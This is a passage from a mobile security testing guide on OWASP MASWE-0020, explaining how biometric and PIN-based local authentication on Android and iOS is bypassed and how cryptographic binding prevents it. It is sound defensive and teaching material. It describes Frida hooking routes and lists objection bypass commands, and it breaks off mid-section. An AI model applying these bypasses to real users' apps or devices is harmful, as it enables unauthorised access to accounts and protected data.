---
title: "Local Authentication Can Be Bypassed (MASWE-0020)"
date: 2026-11-09 08:36:00 +0000
subcategory: auth
summary: "Event-bound biometrics, UI-only PIN screens and client-side auth flags: bypassing them with Frida and objection, and how crypto binding stops it."
refs: [MASWE-0020, MASVS-AUTH-2, MASVS-CRYPTO-2, CWE-285, CWE-287, CWE-602, CWE-603, CWE-863, CWE-922]
tags: [android, ios, masvs-auth, biometrics, local-authentication, frida]
---

This note is part of our [MASVS-AUTH guide](/mobile/masvs-auth-authentication-guide/) and covers OWASP [MASWE-0020](https://mas.owasp.org/MASWE/MASVS-AUTH/MASWE-0020/): local authentication — a fingerprint, a face, the device passcode or an app PIN — that an attacker can skip. It is the central weakness of MASVS-AUTH-2, and it has a simple test: every local authentication check can be bypassed by someone who controls the app process, so the question is never *can the prompt be skipped?* but *what does skipping it yield?* If the answer is "the token, the decrypted data, a signature the server accepts", the authentication was a user-interface element, not a control. Below you will find the mechanics on both platforms (event-bound versus crypto-bound biometrics, `CryptoObject`, `LAContext` and Keychain access control), the five OWASP tests with their demos, the Frida and objection bypasses that prove the weakness and why a correct design defeats them, passive biometrics and authentication validity windows, our own tests for app PIN and passcode lock screens and for server-side enforcement, secure Kotlin and Swift, and severity guidance.

## Contents

- [Overview](#overview)
- [Modes of Introduction](#modes-of-introduction)
- [Impact](#impact)
- [Mitigations](#mitigations)
- [Knowledge](#knowledge)
  - [Android: Biometric Authentication (MASTG-KNOW-0001)](#android-biometric-authentication-mastg-know-0001)
  - [Android: auth-bound Keystore keys (MASTG-KNOW-0043, MASTG-KNOW-0047, MASTG-KNOW-0012)](#android-auth-bound-keystore-keys-mastg-know-0043-mastg-know-0047-mastg-know-0012)
  - [Android: anatomy of a BiometricPrompt bypass](#android-anatomy-of-a-biometricprompt-bypass)
  - [iOS: Local Authentication Framework (MASTG-KNOW-0056)](#ios-local-authentication-framework-mastg-know-0056)
  - [iOS: Keychain Services for local authentication (MASTG-KNOW-0057)](#ios-keychain-services-for-local-authentication-mastg-know-0057)
  - [Both platforms: app PINs, app locks and remember me](#both-platforms-app-pins-app-locks-and-remember-me)
  - [Both platforms: what the server can know about local authentication](#both-platforms-what-the-server-can-know-about-local-authentication)
- [Tests](#tests)
  - [MASTG-TEST-0327: References to APIs for Event-Bound Biometric Authentication (Android)](#mastg-test-0327-references-to-apis-for-event-bound-biometric-authentication-android)
  - [MASTG-TEST-0329: References to APIs Enforcing Authentication without Explicit User Action (Android)](#mastg-test-0329-references-to-apis-enforcing-authentication-without-explicit-user-action-android)
  - [MASTG-TEST-0330: References to APIs for Keys used in Biometric Authentication with Extended Validity Duration (Android)](#mastg-test-0330-references-to-apis-for-keys-used-in-biometric-authentication-with-extended-validity-duration-android)
  - [MASTG-TEST-0266: References to APIs for Event-Bound Biometric Authentication (iOS)](#mastg-test-0266-references-to-apis-for-event-bound-biometric-authentication-ios)
  - [MASTG-TEST-0267: Runtime Use Of Event-Bound Biometric Authentication (iOS)](#mastg-test-0267-runtime-use-of-event-bound-biometric-authentication-ios)
  - [GT-0020-1: Runtime bypass of BiometricPrompt (Android)](#gt-0020-1-runtime-bypass-of-biometricprompt-android)
  - [GT-0020-2: App PIN and passcode lock screens (Android and iOS)](#gt-0020-2-app-pin-and-passcode-lock-screens-android-and-ios)
  - [GT-0020-3: Server-side enforcement of local authentication (Android and iOS)](#gt-0020-3-server-side-enforcement-of-local-authentication-android-and-ios)
- [Best practices](#best-practices)
  - [MASTG-BEST-0036: Use Cryptographic Binding for Biometric Authentication](#mastg-best-0036-use-cryptographic-binding-for-biometric-authentication)
  - [MASTG-BEST-0038: Require Explicit User Confirmation for Biometric Authentication](#mastg-best-0038-require-explicit-user-confirmation-for-biometric-authentication)
- [Secure implementation](#secure-implementation)
- [Rating findings](#rating-findings)
- [References](#references)

## Overview

MASWE-0020 applies when local authentication can be bypassed because it is implemented as an **event** the app reacts to, rather than as a **condition** on a cryptographic operation the app cannot perform without it. The OWASP requirement is *"The app implements local authentication securely."*

Every local authentication mechanism ends in a decision. The difference between a weak and a strong implementation is *where* that decision is enforced:

| Pattern | Where the decision lives | What one hook achieves | Verdict |
|---|---|---|---|
| `BiometricPrompt.authenticate(promptInfo)` without `CryptoObject`; the success callback unlocks a screen or returns a stored token | `onAuthenticationSucceeded` in app code | Full bypass: the attacker calls the callback | Event-bound — fails |
| `LAContext.evaluatePolicy` with an `if success { … }` in the reply block | The reply block in app code | Full bypass: objection's `ios ui biometrics_bypass` | Event-bound — fails |
| App PIN compared with a stored value; an `isUnlocked` flag in preferences | App code and app storage | Full bypass: flip the flag, or brute-force the stored PIN offline | UI gate — fails |
| `CryptoObject` with a Keystore key that does **not** require authentication | Nowhere: the key works anyway | Full bypass: fire the callback with the app's own `CryptoObject` | Looks crypto-bound — fails |
| Key with `setUserAuthenticationRequired(true)` and a validity window (timeout > 0) | Keystore, but satisfied by any recent unlock | Bypass inside the window | Weak binding — depends on window |
| Per-operation auth-bound key (timeout 0) used through `CryptoObject`; the secret only exists as ciphertext | Keystore and TEE/StrongBox | Nothing: `doFinal` throws | Crypto-bound — passes |
| Keychain item or Secure Enclave key with a user-presence `SecAccessControl` | `securityd` and the Secure Enclave | Nothing: `SecItemCopyMatching` prompts or fails | Crypto-bound — passes |
| Server accepts a sensitive request only with a signature from a per-operation auth-bound key over a fresh server challenge | The server | Nothing usable: no signature, no operation | Server-bound — the goal for connected apps |

The underlying principle: authentication that releases nothing cryptographic can be replaced by code that says "success". Authentication that the secure hardware requires before it will decrypt, sign or release a Keychain item cannot be replaced, because the attacker who fakes the callback still has no plaintext and no signature. That is why OWASP frames the fix as *binding* rather than *checking*.

**MASVS-AUTH and the server.** MASVS-AUTH states that authentication and authorisation must ultimately be enforced on the remote endpoint. Local authentication is a client-side control, and for connected apps it is only meaningful in two cases: when it protects data or keys that live on the device (an offline vault, a cached token), or when it produces evidence the server verifies (a signature from an authentication-bound key, a WebAuthn assertion with the user-verified flag). Be explicit in your report about which of these the app claims and which you proved:

- **From the client** you can prove that the prompt or PIN can be bypassed, what the bypass yields on the device (a decrypted token, unlocked screens, a working key), and whether the requests the app sends after authentication carry any cryptographic evidence of it.
- **Against the backend** (in scope only if the engagement includes the API) you can prove whether the server *requires* that evidence: whether it accepts sensitive requests without the signature, with a replayed signature, or with a key the attacker enrolled. That is a server-side authorisation test; OWASP's [WSTG](https://owasp.org/www-project-web-security-testing-guide/) covers the techniques (WSTG-ATHN-04 *Testing for Bypassing Authentication Schema*, WSTG-ATHZ-02 *Testing for Bypassing Authorization Schema*) and OWASP [ASVS 5.0](https://owasp.org/www-project-application-security-verification-standard/) chapters V6 (Authentication) and V8 (Authorization) define the requirements.
- **A finding that the server trusts a client-side decision** is demonstrated by a request that the server accepts and that the legitimate app would only send after local authentication — for example a request with `"biometricVerified": true`, or the same payment request replayed without any signature. See [GT-0020-3](#gt-0020-3-server-side-enforcement-of-local-authentication-android-and-ios).

**The attacker.** OWASP maps MASWE-0020 to four attacks: debugging the app at runtime (MAS-ATTACK-0002), dynamic instrumentation (MAS-ATTACK-0003), invoking keystore operations on a compromised or stolen device when key use does not require user authentication (MAS-ATTACK-0027), and patching or repackaging the app to remove or alter client-side checks (MAS-ATTACK-0040). The threat is MAS-THREAT-0020: *"Attackers can bypass local authentication and access protected data or functionality."* In practice that is:

- someone with your phone and a few minutes — the unlocked phone on the desk, the partner who knows the passcode but not the banking PIN, the thief who shoulder-surfed the device passcode;
- malware or a tester with root or a jailbreak, running Frida or a debugger inside the app process;
- a malicious or compromised SDK inside the app, which already *is* the app process.

Unlike the passcode check in our [MASWE-0017 note](/mobile/maswe-0017-device-secure-lock-not-enforced/#what-bypassing-the-check-proves-and-does-not-prove), where hooking a Boolean proves little, **instrumentation is in MASWE-0020's threat model**. A Frida bypass of an event-bound prompt is the finding, provided you also show what it yields.

**Profiles: L2 and EUDIW.** MASWE-0020 carries the [MAS-L2](https://mas.owasp.org/Profiles/MAS-L2/) and [MAS-EUDIW](https://mas.owasp.org/Profiles/MAS-EUDIW/) profiles. L2 covers apps where compromise has serious consequences (banking, payments, health, government, enterprise access); EUDIW is the profile for European Digital Identity Wallet apps, where the user's consent to present a credential is exactly the kind of decision local authentication is supposed to protect. In an L1-only engagement, an event-bound prompt over non-sensitive content is a hardening observation; in L2 apps and wallets it is a finding.

**Mappings.** MASVS-AUTH-2 (local authentication performed securely according to platform best practices) and MASVS-CRYPTO-2 (key management). CWE: [CWE-285](https://cwe.mitre.org/data/definitions/285.html) Improper Authorization, [CWE-287](https://cwe.mitre.org/data/definitions/287.html) Improper Authentication, [CWE-312](https://cwe.mitre.org/data/definitions/312.html) Cleartext Storage of Sensitive Information, [CWE-319](https://cwe.mitre.org/data/definitions/319.html) Cleartext Transmission of Sensitive Information, [CWE-326](https://cwe.mitre.org/data/definitions/326.html) Inadequate Encryption Strength, [CWE-602](https://cwe.mitre.org/data/definitions/602.html) Client-Side Enforcement of Server-Side Security, [CWE-603](https://cwe.mitre.org/data/definitions/603.html) Use of Client-Side Authentication, [CWE-863](https://cwe.mitre.org/data/definitions/863.html) Incorrect Authorization and [CWE-922](https://cwe.mitre.org/data/definitions/922.html) Insecure Storage of Sensitive Information. MASVS v1 equivalents are MSTG-AUTH-1, MSTG-AUTH-8 and MSTG-AUTH-12, and the Android Core App Quality guideline *Biometric_Authentication* covers the same ground. The weakness consolidates several entries from the earlier beta MASWE list (MASWE-0034 and MASWE-0041 to MASWE-0044).

The neighbouring weaknesses split the topic as follows, and this note links rather than repeats them: key restrictions in general are [MASWE-0016](/mobile/maswe-0016-key-access-not-restricted/); keys outside the platform keystore are [MASWE-0003](/mobile/maswe-0003-crypto-keys-outside-platform-keystore/); the device passcode and `LAContext` policies are [MASWE-0017](/mobile/maswe-0017-device-secure-lock-not-enforced/); passcode fallback for sensitive transactions is [MASWE-0021](/mobile/maswe-0021-non-biometric-fallback-for-sensitive-transactions/); keys surviving new biometric enrolment are [MASWE-0022](/mobile/maswe-0022-keys-not-invalidated-on-biometric-enrollment/); and reaching protected screens through exported components, without any prompt at all, is [MASWE-0018](/mobile/maswe-0018-missing-auth-on-app-components/).

## Modes of Introduction

**Event-bound biometric checks.** The app shows `BiometricPrompt` without a `CryptoObject`, or calls `LAContext.evaluatePolicy`, and acts on the result in its own code: navigates to the home screen, reads the refresh token from storage, enables the "Pay" button. The secret was readable all along. This is by far the most common mode, and every cross-platform plugin that returns a Boolean — Flutter's `local_auth`, Expo's `expo-local-authentication`, many React Native wrappers — produces it by construction, with the decision made in Dart or JavaScript.

**A `CryptoObject` around a key that needs nothing.** The app wraps a `Cipher` in a `CryptoObject` but the key was generated without `setUserAuthenticationRequired(true)` (the OWASP demo for MASTG-TEST-0327 does exactly this). The prompt looks crypto-bound in a code review that stops at the `authenticate` call; the Keystore never asks for authentication.

**The crypto result is not used.** The app authenticates with a `CryptoObject`, then ignores the returned cipher, or encrypts a dummy value and treats "no exception" as success, or catches the `IllegalBlockSizeException` the Keystore throws for an unauthenticated operation and carries on. Reversec's research on Android Keystore authentication describes this "exception handling" variant and ships a Frida script for it.

**Weak Keychain access control.** iOS items holding the "protected" secret have only an accessibility class and no `SecAccessControl`, or a flag that does not express the intended factor — `.privateKeyUsage` alone on a Secure Enclave key, `.biometryAny` (formerly `kSecAccessControlTouchIDAny`) where re-enrolment should revoke access, or `.devicePasscode` where biometrics were promised. The `LAContext` prompt in front of the item is decoration.

**Long validity windows and device-credential flows.** Android keys with `setUserAuthenticationParameters(timeout > 0, …)` or the deprecated `setUserAuthenticationValidityDurationSeconds(n > 0)` are usable for `n` seconds after *any* authentication, including the user unlocking the phone. Legacy "Confirm Credentials" flows (`KeyguardManager.createConfirmDeviceCredentialIntent`, deprecated in API 29) check `RESULT_OK` in `onActivityResult` and are event-bound unless they gate such a key.

**Passive biometrics without confirmation.** `setConfirmationRequired(false)` lets a Class 3 face sensor complete authentication the moment it sees the user's face. The authentication is real, but the user's *intent* is not established — for a payment, the phone held up in front of its owner is enough.

**Local-only enforcement.** For apps with a backend, the server treats the session token as sufficient for operations the app protects locally (viewing a card PIN, payments, changing the phone number), or accepts a client-supplied flag such as `"localAuth": "passed"`. Any bypass on the client then becomes a bypass of the server's authorisation.

**App PINs as UI gates.** A custom four- or six-digit PIN screen that compares the input with a value in `SharedPreferences`, `UserDefaults`, a database or the Keychain, then sets an `unlocked` flag. Typical defects come in combination: the stored verifier is the PIN itself or an unsalted fast hash (a 10,000-entry keyspace falls in milliseconds offline); the failed-attempt counter lives in the same writable storage or in memory; the lock state is a Boolean or a timestamp the attacker can edit; and the session token the PIN "protects" sits next to it in plaintext.

**Hardcoded or default credentials.** A developer or support PIN compared in code (`if (pin == "000000")`), a master unlock code, or a debug flag that skips the lock in release builds.

## Impact

- **Authentication or authorisation bypass.** An attacker triggers the protected functionality — opening the account, authorising a payment, presenting an identity credential, revealing a card PIN — without the user's biometrics, passcode or PIN. Where the server trusts the client's decision, the bypass is also a server-side authorisation bypass.
- **Compromise of sensitive data.** Data that was supposed to be gated by local authentication (refresh tokens, offline records, the vault key) is readable by anyone who can run code as the app, or can be extracted from storage and used elsewhere.
- **Loss of non-repudiation and consent.** A signature or consent produced without real user authentication undermines the evidence the service relies on for disputes and for regulated flows such as payment authentication and wallet presentations. OWASP tracks the evidence side as [MASWE-0025](/mobile/maswe-0025-lack-of-non-repudiation/).
- **Persistence.** An app PIN brute-forced offline, or a refresh token copied out of storage, keeps working after the attacker has given the phone back.

## Mitigations

- **Bind authentication to a key operation.** On Android, use `BiometricPrompt.authenticate(promptInfo, CryptoObject)` with a Keystore key created with `setUserAuthenticationRequired(true)` and `setUserAuthenticationParameters(0, AUTH_BIOMETRIC_STRONG)`, and make the protected secret exist only as ciphertext under that key (OWASP [MASTG-BEST-0036](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0036/)). On iOS, store the secret in a Keychain item (or use a Secure Enclave key) whose `SecAccessControl` requires user presence — `.biometryCurrentSet` for biometric-only — and let the Keychain show the prompt.
- **Use strict parameters.** Per-operation authentication for sensitive keys; short, justified windows otherwise; invalidation on enrolment change (MASWE-0022); no weaker factor than the operation requires (MASWE-0021).
- **Enforce on the server.** For connected apps, gate sensitive server resources on evidence the server can verify: a signature over a fresh, single-use server challenge from a per-operation auth-bound key enrolled after strong authentication, or a passkey/WebAuthn assertion with the user-verified flag checked. Never on a client Boolean.
- **Bind custom PINs to key material.** On iOS, use the `.applicationPassword` access-control flag so the PIN is an input to the item's protection rather than a value compared in app code. On either platform, prefer verifying a PIN on the server, where an attempt counter cannot be reset by editing a file.
- **Require explicit confirmation** for passive biometrics on sensitive operations: keep the default `setConfirmationRequired(true)` (OWASP [MASTG-BEST-0038](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0038/)).
- **Resist guessing.** Make every PIN attempt depend on hardware-backed or server-held material so guesses cannot be run off-device, and combine an app-defined PIN with an OS-throttled factor (biometric or device credential) or a server-side attempt limit.
- **Protect what the lock protects.** An app lock or "remember me" must leave the session secret encrypted under an auth-bound key, not in plaintext behind a screen.

## Knowledge

The OWASP Knowledge pages linked to MASWE-0020 describe the platform mechanisms. Several of them are covered in depth in other notes on this site; below we summarise what local authentication needs from each, add the material the OWASP pages leave out, and link rather than repeat.

### Android: Biometric Authentication (MASTG-KNOW-0001)

Source: [MASTG-KNOW-0001](https://mas.owasp.org/MASTG/knowledge/android/MASVS-AUTH/MASTG-KNOW-0001/). Our full walkthrough is the [MASTG-KNOW-0001 note](/mobile/mastg-know-0001-biometric-authentication/), and the legacy fingerprint API is in the [MASTG-KNOW-0002 note](/mobile/mastg-know-0002-fingerprintmanager/). In summary: apps use `BiometricPrompt` (Jetpack `androidx.biometric`, or the framework `android.hardware.biometrics` class from API 28) to show a system-rendered dialog, `BiometricManager.canAuthenticate(int)` to check availability, and the authenticator constants `BIOMETRIC_STRONG` (Class 3), `BIOMETRIC_WEAK` (Class 2) and `DEVICE_CREDENTIAL` to say what is acceptable. Only Class 3 biometrics can authorise Keystore keys.

What matters for MASWE-0020 is the exact shape of the API, because the tests look for it in decompiled code:

| Library | Event-bound call | Crypto-bound call |
|---|---|---|
| Jetpack `androidx.biometric.BiometricPrompt` | `authenticate(PromptInfo)` | `authenticate(PromptInfo, CryptoObject)` |
| Framework `android.hardware.biometrics.BiometricPrompt` (API 28+) | `authenticate(CancellationSignal, Executor, AuthenticationCallback)` | `authenticate(CryptoObject, CancellationSignal, Executor, AuthenticationCallback)` |
| `FingerprintManager` (API 23–27, deprecated in 28) | `authenticate(null, cancel, flags, callback, handler)` | `authenticate(cryptoObject, cancel, flags, callback, handler)` |

The callback has three methods. `onAuthenticationSucceeded(AuthenticationResult)` is called once, with a result object carrying `getCryptoObject()` (the same `Cipher`, `Signature` or `Mac` the app passed in, now authorised for one operation) and, from API 30, `getAuthenticationType()` (`AUTHENTICATION_RESULT_TYPE_BIOMETRIC` = 2 or `AUTHENTICATION_RESULT_TYPE_DEVICE_CREDENTIAL` = 1). `onAuthenticationFailed()` reports a rejected biometric while the prompt stays open; `onAuthenticationError(code, message)` ends the session (user cancel, lockout, no hardware). An event-bound implementation is one in which **all** of the security lives in what the app does inside `onAuthenticationSucceeded`; a crypto-bound one is one in which the method can only produce the protected value by calling `result.cryptoObject.cipher.doFinal(…)` or `…signature.sign()`.

Three `PromptInfo` settings change the security of the prompt and appear in the tests:

- `setAllowedAuthenticators(int)` — `BIOMETRIC_STRONG`, `BIOMETRIC_WEAK`, `DEVICE_CREDENTIAL`, or a combination. A prompt that allows `BIOMETRIC_WEAK` cannot carry a `CryptoObject` at all, so it is event-bound for every user whose sensor is Class 2 (many face-unlock implementations are). Device credential with a `CryptoObject` needs API 30. Passcode fallback is MASWE-0021's subject.
- `setConfirmationRequired(boolean)` — default `true`. With `false`, a passive modality (face, iris) completes without the user pressing **Confirm**. It is a hint: fingerprint is always an explicit action, and on some devices the user can force confirmation in system settings (Pixel phones with Face Unlock, for example, offer an "always require confirmation" option for apps). See [MASTG-TEST-0329](#mastg-test-0329-references-to-apis-enforcing-authentication-without-explicit-user-action-android).
- `setNegativeButtonText(…)` — required unless `DEVICE_CREDENTIAL` is allowed. Look at what the negative button does: "Use PIN instead" leading to an app-level PIN screen means the biometric is only as strong as that PIN (see [GT-0020-2](#gt-0020-2-app-pin-and-passcode-lock-screens-android-and-ios)).

**Confirm Credentials.** Before `BiometricPrompt` supported device credentials, apps used `KeyguardManager.createConfirmDeviceCredentialIntent(title, description)` and checked `resultCode == RESULT_OK` in `onActivityResult`. It is deprecated since API 29 in favour of `BiometricPrompt` with `DEVICE_CREDENTIAL`. On its own it is event-bound; the legacy MASTG v1 test [MASTG-TEST-0017](https://mas.owasp.org/MASTG/tests/android/MASVS-AUTH/MASTG-TEST-0017/) asked the right question: is the key unlocked by that confirmation actually used to decrypt something, and for how long is it authorised?

**Wrappers and SDKs.** Many apps never call `BiometricPrompt` directly. Flutter's `local_auth` plugin, Expo's `expo-local-authentication` and similar packages return a Boolean to Dart or JavaScript; the native side calls the event-bound overload. Vendor "biometric SDKs" vary. Always follow the call to the platform API and to where the decision is consumed; for Flutter and React Native, that decision may sit in `libapp.so` or the JavaScript bundle rather than in Java.

### Android: auth-bound Keystore keys (MASTG-KNOW-0043, MASTG-KNOW-0047, MASTG-KNOW-0012)

Sources: [MASTG-KNOW-0043](https://mas.owasp.org/MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0043/) (Android KeyStore), [MASTG-KNOW-0047](https://mas.owasp.org/MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0047/) (Cryptographic Key Storage) and [MASTG-KNOW-0012](https://mas.owasp.org/MASTG/knowledge/android/MASVS-CRYPTO/MASTG-KNOW-0012/) (Key Generation). Keystore basics — security levels, TEE versus StrongBox, `KeyInfo.isInsideSecureHardware()`, why keys belong in the Keystore rather than `SharedPreferences` — are in our [MASWE-0003 note](/mobile/maswe-0003-crypto-keys-outside-platform-keystore/). Every user-authentication setter on `KeyGenParameterSpec.Builder`, with defaults and API levels, is tabulated in our [MASWE-0016 note](/mobile/maswe-0016-key-access-not-restricted/#android-keystore-key-authorisations-mastg-know-0043-mastg-know-0012). Here is the part local authentication depends on.

**What the Keystore actually checks.** When the user authenticates — with the lock-screen credential (verified by Gatekeeper) or a Class 3 biometric (verified by the biometric HAL in the TEE) — the secure world issues a *hardware authentication token* (HAT), HMAC-signed with a key shared only between the trusted components. KeyMint, which holds the app's key, accepts an operation on an auth-bound key only with a valid HAT:

- **Per-operation keys** (`setUserAuthenticationParameters(0, …)`, or the deprecated `setUserAuthenticationValidityDurationSeconds(-1)`): when the app calls `Cipher.init`, Keystore starts an operation and gives it a challenge. `BiometricPrompt.authenticate(…, CryptoObject)` passes that operation's identifier to the biometric stack, so the HAT it receives contains *that* challenge. KeyMint lets `update`/`doFinal` proceed only with a HAT for that operation. This is the cryptographic binding the OWASP pages describe: no prompt for this operation, no result — and an app process cannot forge a HAT.
- **Time-bound keys** (timeout > 0): KeyMint accepts any HAT of an allowed type whose timestamp is younger than the timeout. Unlocking the phone produces such a HAT. Outside the window `Cipher.init` throws `UserNotAuthenticatedException`; inside it the key works without any prompt from the app, which is why time-bound keys are normally used with an event-bound `authenticate(promptInfo)` followed by `Cipher.init`.
- **No authentication required** (the default): no HAT is needed, and a `CryptoObject` wrapped around such a key is ceremony.

**Exceptions tell you which case you are in.** In a test, the exception is often the most precise evidence you can collect:

| Exception | Thrown at | Means |
|---|---|---|
| `IllegalBlockSizeException` caused by `android.security.KeyStoreException: Key user not authenticated` | `doFinal` / `sign` | Per-operation key used without a matching authentication — the binding held |
| `UserNotAuthenticatedException` | `init` | Time-bound key outside its window |
| `KeyPermanentlyInvalidatedException` | `init` | Key invalidated by new biometric enrolment or removal of the secure lock screen |
| None | — | Either the user really authenticated, the window was open, or the key needs no authentication |

**Two crypto-bound designs.** The OWASP knowledge pages describe both; choose by whether the server is involved.

1. *Local secret under an auth-bound key (offline or token protection).* At enrolment, generate an AES-GCM key with `setUserAuthenticationRequired(true)`, encrypt the refresh token (or a vault key), store only ciphertext and IV, and delete the plaintext. At each use, `Cipher.init(DECRYPT_MODE, key, GCMParameterSpec(128, iv))`, wrap it in a `CryptoObject`, authenticate, and decrypt in the callback. With a symmetric per-operation key, encryption needs a prompt too (the OWASP demo prompts twice); if that is a problem, use an RSA key pair where encryption with the public key needs no authentication and only decryption does.
2. *Signature over a server challenge (connected apps).* At enrolment, generate an EC key pair with `PURPOSE_SIGN` and per-operation authentication, register the public key (ideally with its key attestation chain) with the server. For each sensitive operation, the server sends a fresh nonce, the app signs nonce plus operation details through a `CryptoObject`-bound `Signature`, and the server verifies. This is the stronger design because the proof is checked off-device; it is the model behind FIDO authenticators and passkeys.

**Where the plaintext goes next.** MASTG-KNOW-0047's storage ranking has a corollary for local authentication: a crypto-bound flow protects only what remains encrypted. If, after the first successful decryption, the app writes the token to `SharedPreferences`, a Room database, a static field or a non-auth-bound `EncryptedSharedPreferences` file, every later launch is effectively event-bound. (The Jetpack Security `EncryptedSharedPreferences` and `EncryptedFile` classes are deprecated; their master key is not auth-bound unless the developer asked for it, so they do not add local authentication by themselves.)

Restriction-level detail — invalidation on enrolment (MASWE-0022), `setUnlockedDeviceRequired`, key attestation of `userAuthType` and `authTimeout` — is covered in the [MASWE-0016 note](/mobile/maswe-0016-key-access-not-restricted/#android-user-authentication-binding-and-validity-mastg-know-0001).

### Android: anatomy of a BiometricPrompt bypass

This section is Guler Tech material. It explains what the standard bypasses do, so that you can interpret the result of [GT-0020-1](#gt-0020-1-runtime-bypass-of-biometricprompt-android) and explain it in a report.

A bypass on Android does not defeat the biometric sensor. It makes the app *believe* authentication succeeded, by one of three routes:

1. **Fire the callback.** Hook `authenticate(…)`, do not show the prompt, and call the app's `AuthenticationCallback.onAuthenticationSucceeded()` with a constructed `AuthenticationResult`. For the event-bound overload, the result carries a `null` `CryptoObject`; for the crypto-bound overload, the hook can hand back the app's own `CryptoObject`, which wraps a cipher that the Keystore has *not* authorised. This is what Reversec's `fingerprint-bypass.js` does (referenced by the legacy MASTG v1 test [MASTG-TEST-0018](https://mas.owasp.org/MASTG/tests/android/MASVS-AUTH/MASTG-TEST-0018/)).
2. **Swallow the Keystore's refusal.** When the app does call `doFinal` on the unauthorised cipher, the Keystore throws `IllegalBlockSizeException`. If the app catches it and proceeds anyway — or only used the cipher on a dummy value — the bypass still succeeds. Reversec's `fingerprint-bypass-via-exception-handling.js` automates this: it fires the callback and catches the exception thrown by `doFinal` so the app's flow continues.
3. **Skip the decision.** Hook or patch the app's own logic after the callback — an `isAuthenticated()` method, a `LiveData` emitting `AuthState.SUCCESS`, the branch that starts `HomeActivity` — or simply start the post-authentication activity directly (objection's `android intent launch_activity`). Repackaging with a patched branch (MASTG [MASTG-TECH-0038](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0038/) and [MASTG-TECH-0039](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0039/)) does the same statically, though a re-signed app is a fresh install without the victim's data, so it demonstrates the logic rather than an attack on an existing install.

The outcome then depends entirely on the key:

| Key behind the prompt | Route 1 (callback fired, crypto passed through) | Route 2 (exception swallowed) |
|---|---|---|
| No `CryptoObject`, secret stored in plaintext or under a non-auth key | **Bypass** — the app reads the secret | n/a |
| `CryptoObject`, key without `setUserAuthenticationRequired(true)` | **Bypass** — `doFinal` succeeds | n/a |
| Time-bound key, device unlocked within the window | **Bypass** — `doFinal` succeeds | n/a |
| Per-operation auth-bound key, result used | Refused — `IllegalBlockSizeException`; the app shows an error | Bypass **only if** the app ignores the exception and does not need the plaintext |
| Per-operation key signing a server challenge, server verifies | Refused locally; even a swallowed exception produces no valid signature, so the server rejects the request | Server rejects |

That last row is the design to recommend: whatever an attacker does inside the app, the server never sees a valid signature.

**objection on Android.** objection does not ship an Android equivalent of its iOS `biometrics_bypass` command. What it does well is reconnaissance and small patches: `android hooking search classes biometric` to find wrappers, `android hooking watch class <class>` to see which callback methods fire (and `android hooking watch class_method <class.method> --dump-args --dump-return` for one method's arguments and return value), `android hooking set return_value <class.method> true` to force a Boolean gate such as `isAppUnlocked`, `android intent launch_activity <activity>` to start a post-login activity from inside the app process, and `import <script.js>` to load a Frida script such as the one in GT-0020-1 into the session.

### iOS: Local Authentication Framework (MASTG-KNOW-0056)

Source: [MASTG-KNOW-0056](https://mas.owasp.org/MASTG/knowledge/ios/MASVS-AUTH/MASTG-KNOW-0056/). The policies (`.deviceOwnerAuthenticationWithBiometrics` = 1, `.deviceOwnerAuthentication` = 2), `canEvaluatePolicy` and its error codes, `biometryType`, `touchIDAuthenticationAllowableReuseDuration` and `evaluatedPolicyDomainState`/`domainState` are covered in our [MASWE-0017 note](/mobile/maswe-0017-device-secure-lock-not-enforced/#ios-local-authentication-framework-mastg-know-0056), which also explains [why `LAContext` alone is event-bound](/mobile/maswe-0017-device-secure-lock-not-enforced/#why-lacontext-alone-is-event-bound). For MASWE-0020, three details matter.

**The reply block is the whole control.** `evaluatePolicy(_:localizedReason:reply:)` runs the authentication in a system process (`coreauthd`, with the Secure Enclave matching the biometric) and then calls the app's `reply(success, error)` block. The only thing that crosses back into the app is a Boolean and an optional `NSError`. If the app's next step is "read the token from `UserDefaults`" or "show the account screen", that step is reachable by anyone who can call the block with `true`. The Swift `async` form (`try await context.evaluatePolicy(…)`, iOS 15+) is the same Objective-C method underneath, with the compiler generating the completion handler, so the same hook catches both.

**How objection's bypass works.** `ios ui biometrics_bypass` registers a Frida job that intercepts `-[LAContext evaluatePolicy:localizedReason:reply:]`, wraps the `reply` block the app passed in, lets the real evaluation happen, and when the system answers `false` calls the app's block with `true` instead ("Marking OS response as True instead" in the output). You still see the system sheet — cancel it — and the app proceeds. It works on Swift and Objective-C apps alike, and it fails cleanly against crypto-bound designs: if the app's success path is `SecItemCopyMatching` on an item with user-presence access control, the Keychain asks for authentication itself, and the forged Boolean has not authenticated anything in `coreauthd` (see the next section).

**`LAContext` as an input to the Keychain.** An `LAContext` can be *used* correctly: create it, optionally evaluate it, then pass it to the Keychain query in `kSecUseAuthenticationContext`. The Keychain then uses that context's authentication — which is tracked by the system, not by the app — instead of prompting again. Apple's *Accessing keychain items with Face ID or Touch ID* sample follows this pattern. Related APIs: `evaluateAccessControl(_:operation:localizedReason:reply:)` pre-authorises a specific `SecAccessControl` for an operation; `interactionNotAllowed` makes the query fail rather than prompt; `LARight` and `LAPersistedRight` (iOS 16+) package "a right backed by a Secure Enclave key" in a higher-level API. In all of these, the authentication *feeds* a system-enforced check; none of them makes a Boolean in the app a security boundary.

A quick static hint: apps that use Face ID must declare `NSFaceIDUsageDescription` in `Info.plist`, and link `LocalAuthentication.framework` (visible with `otool -L`).

### iOS: Keychain Services for local authentication (MASTG-KNOW-0057)

Source: [MASTG-KNOW-0057](https://mas.owasp.org/MASTG/knowledge/ios/MASVS-AUTH/MASTG-KNOW-0057/). Accessibility classes and their raw `pdmn` values, the full `SecAccessControlCreateFlags` table with raw bits, access groups and Secure Enclave key ACLs are in our [MASWE-0016 note](/mobile/maswe-0016-key-access-not-restricted/#ios-access-control-flags-mastg-know-0056-mastg-know-0057). For local authentication, the essentials:

